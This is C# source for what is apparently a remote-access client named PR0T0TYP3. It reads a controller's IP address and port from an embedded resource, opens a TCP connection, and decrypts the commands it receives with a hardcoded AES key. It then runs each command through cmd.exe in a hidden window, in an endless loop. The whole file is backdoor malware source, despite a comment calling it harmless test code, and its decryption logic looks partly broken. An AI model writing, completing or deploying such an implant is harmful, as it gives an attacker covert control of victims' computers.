using System;
using System.Collections;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Reflection;
using System.Resources;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace PR0T0TYP3
{
	//This is legit just code, doesn't actually do much here. The temp.resources file is what makes it work, however the resource file here is just a test and doesn't do much
	class PR0T0TYP3_CLIENT
	{
		static void Main(String[] args)
		{
			var assembly = Assembly.GetExecutingAssembly();
			Stream fs = assembly.GetManifestResourceStream("Client.temp.resources");
			var readed = new System.Resources.ResourceReader(fs);
			IDictionaryEnumerator dict = readed.GetEnumerator();
			dict.MoveNext();
			String ipAddress = (String)dict.Value;
			dict.MoveNext();
			int port = Convert.ToInt32((String)dict.Value);

			TcpClient tcpCli = new TcpClient();
			tcpCli.Connect(ipAddress, port);

			while (true)
			{
				String dataRcved = DownloadData(tcpCli);

				System.Diagnostics.Process process = new System.Diagnostics.Process();
				System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
				startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
				startInfo.FileName = "cmd.exe";
				startInfo.Arguments = dataRcved;
				process.StartInfo = startInfo;
				process.Start();
			}
			
		}

		public static String DownloadData(TcpClient curClient)
		{
			String dataS = "";
			while (true)
			{
				byte[] data = new byte[256];
				NetworkStream stream = curClient.GetStream();
				int byteCount = stream.Read(data, 0, data.Length);

				if (byteCount == 0)
				{
					break;
				}
				dataS = decrypt(Convert.ToBase64String(data));
			}
			if (!String.IsNullOrEmpty(dataS))
				return dataS;
			else
				return null;
		}

		public static byte[] encrypt(String someString)
		{
			byte[] encrypted;

			using (AesManaged theAes = new AesManaged())
			{
				theAes.Key = stringToByteArray("dd0ecb45c37b2fa02f7d924de0e48301"); //You may replace this key with any AES 128-bit key

				byte[] IV = new byte[] { 0x7E, 0xB6, 0x8E, 0x01, 0x4D, 0x4F, 0xE9, 0x71, 0xF5, 0x77, 0x6F, 0x13, 0x7C, 0xA0, 0x78, 0x11, };

				theAes.IV = IV;

				theAes.Mode = CipherMode.CBC;

				theAes.Padding = PaddingMode.PKCS7;

				var encryptor = theAes.CreateEncryptor(theAes.Key, theAes.IV);

				using (var mem = new MemoryStream())
				{
					using (var crypto = new CryptoStream(mem, encryptor, CryptoStreamMode.Write))
					{
						using (var sWriter = new StreamWriter(crypto))
						{
							sWriter.Write(someString);
						}
						encrypted = mem.ToArray();
					}
				}
				var combinedIvCt = new byte[IV.Length + encrypted.Length];
				Array.Copy(IV, 0, combinedIvCt, 0, IV.Length);
				Array.Copy(encrypted, 0, combinedIvCt, IV.Length, encrypted.Length);
				return combinedIvCt;
			}
		}

		public static byte[] stringToByteArray(String hex)
		{
			int hexLength = hex.Length;
			byte[] bytes = new byte[hexLength / 2];
			for (int i = 0; i < hexLength; i += 2)
				bytes[i / 2] = Convert.ToByte(hex.Substring(i, 2), 16);
			return bytes;
		}

		public static string decrypt(string cipherTexts)
		{
			string plaintext;
			using (AesManaged aesAlg = new AesManaged())
			{
				aesAlg.Key = stringToByteArray("dd0ecb45c37b2fa02f7d924de0e48301"); //You may replace this key with any AES 128-bit key

				byte[] IV = new byte[aesAlg.BlockSize / 8];

				byte[] cipherTextsConvert = Convert.FromBase64String(cipherTexts);

				byte[] cipherText = new byte[cipherTextsConvert.Length - IV.Length];

				Array.Copy(cipherTextsConvert, IV, IV.Length);
				Array.Copy(cipherTextsConvert, IV.Length, cipherText, 0, cipherText.Length);

				aesAlg.IV = IV;

				aesAlg.Mode = CipherMode.CBC;

				aesAlg.Padding = PaddingMode.PKCS7;

				var decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV);

				using (var msDecrypt = new MemoryStream(cipherText))
				{
					using (var csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
					{
						using (var srDecrypt = new StreamReader(csDecrypt))
						{
							plaintext = srDecrypt.ReadToEnd();
						}
					}
				}
			}
			return plaintext;
		}
	}
}
